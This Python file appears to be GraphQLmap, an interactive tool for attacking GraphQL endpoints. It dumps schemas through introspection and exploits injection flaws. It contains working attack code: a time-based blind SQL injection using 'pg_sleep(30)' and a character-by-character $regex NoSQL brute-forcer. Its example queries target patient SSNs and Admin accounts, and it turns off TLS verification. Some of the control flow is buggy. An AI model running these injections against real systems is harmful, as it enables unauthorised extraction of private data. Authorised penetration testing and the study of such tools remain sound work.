#!/usr/bin/python
import time
import sys
import re
import requests
import json
import readline
import argparse
import warnings

cmdlist  = ["exit", "help", "dump", "sqli", "nosqli", "mutation", "$regex", "$ne", "__schema"]

def auto_completer(text, state):
    options = [x for x in cmdlist if x.startswith(text)]
    try:
        return options[state]
    except IndexError:
        return None


def jq(data):
    return json.dumps(data, indent=4, sort_keys=True)

# def display_types(URL):
#     payload = "{__schema{types{name}}}"
#
#     r = requests.get( URL.format(payload) )
#     schema = r.json()
#
#     for names in schema['data']['__schema']['types']:
#         print(names)


def dump_schema(URL, method, auth):
    payload = "fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}"
    with warnings.catch_warnings():
        warnings.filterwarnings('ignore')
        if method == 'GET':
            r = requests.get(URL.format(payload), headers=auth, proxies=proxy, verify=False)
        else:
            payload = '{"query": "query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}'
            r = requests.post(URL, json=json.loads(payload), headers=auth, proxies=proxy, verify=False)
    schema = r.json()
    print("============= [SCHEMA] ===============")
    print("e.g: \033[92mname\033[0m[\033[94mType\033[0m]: arg (\033[93mType\033[0m!)\n")

    for types in schema['data']['__schema']['types']:
        if types['kind'] == "OBJECT":
            print(types['name'])

            if not "__" in types['name']:
                for fields in types['fields']:
                    field_type = ""
                    try:
                        field_type = fields['type']['ofType']['name']
                    except Exception as e :
                        pass

                    print("\t\033[92m{}\033[0m[\033[94m{}\033[0m]: ".format(fields['name'], field_type), end='')


                    # add the field to the autocompleter
                    cmdlist.append(fields['name'])
                    
                    for args in fields['args']:
                        args_name = args.get('name')
                        args_tkind = ""
                        args_ttype = ""

                        try:
                            args_tkind = args['type']['kind']
                        except:
                            pass

                       

                        try:
                            args_ttype = args['type']['ofType']['name']
                        except Exception as e:
                            pass

                        print("{} (\033[93m{}\033[0m!), ".format(args_name, args_ttype), end='')
                        cmdlist.append(args_name)

                    print("")

def exec_graphql(URL, query, method, auth, only_length=0):
    with warnings.catch_warnings():
        warnings.filterwarnings('ignore')
        if method == "GET":
            r = requests.get( URL.format(query), headers=auth, proxies=proxy, verify=False)
        else:
            r = requests.post(URL, json=json.loads(query),headers=auth, proxies=proxy, verify=False)
    try:
        graphql = r.json()
        errors = graphql.get("errors")

        # handle errors in JSON data
        if(errors):
            return ("\033[91m" + errors[0]['message'] + "\033[0m")

        else:
            try:
                jq_data = jq(graphql)

                # handle blind injection (content length)
                if only_length:
                    return (len(jq_data))

                # otherwise return the JSON content
                else:
                    return (jq(graphql))
                    
            except:
                # when the content isn't a valid JSON, return a text
                return (r.text)

    except Exception as e:
        return "\033[91m[!]\033[0m {}".format(str(e))
    
def exec_advanced(URL, query, method, auth):
    # Allow a user to bruteforce character from a charset
    # e.g: {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"AdmiGRAPHQL_CHARSET\"} }"){firstName lastName id}}   
    if "GRAPHQL_CHARSET" in query:
        GRAPHQL_CHARSET = "!$%\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_`abcdefghijklmnopqrstuvwxyz{|}~"
        for c in GRAPHQL_CHARSET:
            length = exec_graphql(URL, query.replace("GRAPHQL_CHARSET", c), method, auth,only_length=1)
            print("[+] \033[92mQuery\033[0m: (\033[91m{}\033[0m) {}".format(length, query.replace("GRAPHQL_CHARSET", c)))


    # Allow a user to bruteforce number from a specified range
    # e.g: {doctors(options: 1, search: "{ \"email\":{ \"$regex\": \"Maxine3GRAPHQL_INCREMENT_10@yahoo.com\"} }"){id, lastName, email}}
    elif "GRAPHQL_INCREMENT_" in query:
        regex = re.compile("GRAPHQL_INCREMENT_(\d*)")
        match = regex.findall(query)

        for i in range(int(match[0])):
            pattern = "GRAPHQL_INCREMENT_" + match[0]
            length = exec_graphql(URL, query.replace(pattern, str(i)), method, auth, only_length=1)
            print("[+] \033[92mQuery\033[0m: (\033[91m{}\033[0m) {}".format(length, query.replace(pattern, str(i))))

    # Otherwise execute the query and display the JSON result
    else:
        print(exec_graphql(URL, query, method, auth))
            
def blind_sql(URL, method, auth):
    query = input("Query > ")
    payload = "1 AND pg_sleep(30) --"
    print("\033[92m[+] Started at: {}\033[0m".format(time.asctime( time.localtime(time.time()))))
    with warnings.catch_warnings():
        warnings.filterwarnings('ignore')
        if method == "GET":
            injected = (URL.format(query)).replace("BLIND_PLACEHOLDER", payload)
            r = requests.get(injected, headers=auth, proxies=proxy, verify=False)
        else:
            injected = query.replace("BLIND_PLACEHOLDER", payload)
            r = requests.post(URL, json=json.loads(injected), headers=auth, proxies=proxy, verify=False)
    print("\033[92m[+] Ended at: {}\033[0m".format(time.asctime( time.localtime(time.time()))))


def blind_nosql(URL, method, auth):
    # Query : {doctors(options: "{\"\"patients.ssn\":1}", search: "{ \"patients.ssn\": { \"$regex\": \"^BLIND_PLACEHOLDER\"}, \"lastName\":\"Admin\" , \"firstName\":\"Admin\" }"){id, firstName}}
    # Check : "5d089c51dcab2d0032fdd08d"

    query = input("Query > ")
    check = input("Check > ")
    data = ""
    data_size = 35
    charset = "0123456789abcdef-"

    while len(data) != data_size:
        for c in charset:
            with warnings.catch_warnings():
                warnings.filterwarnings('ignore')
                if method == "GET":
                    injected = (URL.format(query)).replace("BLIND_PLACEHOLDER", data + c)
                    r = requests.get(injected, headers=auth, proxies=proxy, verify=False)
                else:
                    injected = query.replace("BLIND_PLACEHOLDER", data + c)
                    r = requests.post(URL, json=json.loads(injected), headers=auth, proxies=proxy, verify=False)
            if check in r.text:
                data += c

                # display data and update the current line
                print("\r\033[92m[+] Data found:\033[0m {}".format(data), end='', flush=False)

    # force a line return to clear the screen after the data trick
    print("")

def display_banner():
    print("   _____                 _      ____  _                            ")
    print("  / ____|               | |    / __ \| |                           ")
    print(" | |  __ _ __ __ _ _ __ | |__ | |  | | |     _ __ ___   __ _ _ __  ")
    print(" | | |_ | '__/ _` | '_ \| '_ \| |  | | |    | '_ ` _ \ / _` | '_ \ ")
    print(" | |__| | | | (_| | |_) | | | | |__| | |____| | | | | | (_| | |_) |")
    print("  \_____|_|  \__,_| .__/|_| |_|\___\_\______|_| |_| |_|\__,_| .__/ ")
    print("                  | |                                       | |    ")
    print("                  |_|                                       |_|    ")
    print("                                         Author:Swissky Version:1.0")


def display_help():
    print("[+] \033[92mdump  \033[0m: extract the graphql endpoint and arguments")
    print("[+] \033[92mnosqli\033[0m: exploit a nosql injection inside a graphql query")
    print("[+] \033[92msqli  \033[0m: exploit a sql injection inside a graphql query")
    print("[+] \033[92mexit  \033[0m: gracefully exit the application")

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', action ='store', dest='url',       help="URL to query : example.com/graphql")
    parser.add_argument('-v', action ='store', dest='verbosity', help="Enable verbosity", nargs='?', const=True)
    parser.add_argument('-m', dest='method', help="Set the HTTP method you want this tool to interact with the API",
                        nargs='?', default='GET')
    parser.add_argument('-a', dest='auth', help='Set authentication if needed. The format must be in key:value i.e. '
                                                'header:value', default='')
    parser.add_argument('-p', dest='proxy', help='Set a remote or local proxy i.e. '
                                                '127.0.0.1:8080', default='')
    results = parser.parse_args() 
    if results.url == None:
        parser.print_help()
        exit()
    return results


if __name__ == "__main__":
    display_banner()
    args = parse_args()
    readline.set_completer(auto_completer)
    readline.parse_and_bind("tab: complete")
    if args.auth is not None:
        args.auth = json.loads('{"'+args.auth.split(':')[0]+'":"'+args.auth.split(':')[1]+'"}')
    global proxy

    if args.proxy:
        proxy = dict({'http':args.proxy, 'https':args.proxy})
    else:
        proxy = ''
    while True:
        query = input("GraphQLmap > ")
        cmdlist.append(query)
        if query == "exit" or query == "q": 
            exit()
        if args.method == 'GET':
            args.url += '?query={}'

        elif query == "help":
            display_help()

        elif query == "dump":
            dump_schema(args.url, args.method, args.auth)

        elif query == "nosqli":
            blind_nosql(args.url, args.method, args.auth)

        elif query == "sqli":
            blind_sql(args.url, args.method, args.auth)

        else:
            exec_advanced(args.url, query, args.method, args.auth)
